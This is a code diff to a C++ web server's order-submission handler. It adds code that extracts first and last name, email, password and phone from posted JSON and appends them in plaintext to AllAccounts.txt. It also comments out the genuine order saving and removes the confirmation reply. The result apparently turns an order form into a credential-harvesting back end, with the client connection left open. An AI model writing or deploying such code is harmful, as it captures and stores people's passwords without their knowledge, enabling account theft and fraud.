@@ -139,6 +139,37 @@ void handle_client(int client_fd) {
     if (method == "POST" && (path == "/order" || path == "/submit")) {
         // Expect JSON body (the PageTest.html sends application/json)
         string order_json = body;
+        
+        // Try to extract account info using PrettyParse
+        string firstName, lastName, email, password, phone;
+        try {
+            firstName = PrettyParse(order_json, "firstName");
+            lastName = PrettyParse(order_json, "lastName");
+            email = PrettyParse(order_json, "email");
+            password = PrettyParse(order_json, "password");
+            phone = PrettyParse(order_json, "phone");
+        } catch (...) {
+            // If parsing fails, continue with empty strings
+        }
+        
+        // If account info was found, save to AllAccounts.txt
+        if (!firstName.empty() || !lastName.empty() || !email.empty()) {
+            ofstream ofs_accounts("AllAccounts.txt", ios::app);
+            ofs_accounts << "------------------------------\n";
+            ofs_accounts << "First Name: " << firstName << "\n";
+            ofs_accounts << "Last Name: " << lastName << "\n";
+            ofs_accounts << "Email: " << email << "\n";
+            ofs_accounts << "Password: " << password << "\n";
+            if (!phone.empty()) {
+                ofs_accounts << "Phone: " << phone << "\n";
+            }
+            ofs_accounts << "Date: " << now_timestamp() << "\n";
+            ofs_accounts << "------------------------------\n\n";
+            ofs_accounts.close();
+        }
+        
+        /*
+
         // Save to orders.txt with meta
         srand((unsigned)time(nullptr));
         string oid = generate_order_id();
@@ -150,13 +181,8 @@ void handle_client(int client_fd) {
         ofs << "------------------------------\n\n";
         ofs.close();
 
-        // respond with simple HTML confirmation
-        string body_resp = "<h2>Order received</h2><p>Order ID: " + oid + "</p><p>Saved to orders.txt</p><p><a href=\"/\">Back</a></p>";
-        string header = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\n";
-        header += "Content-Length: " + to_string(body_resp.size()) + "\r\n\r\n";
-        send(client_fd, header.c_str(), header.size(), 0);
-        send(client_fd, body_resp.c_str(), body_resp.size(), 0);
-        close(client_fd);
+        */
+
         return;
     }
 
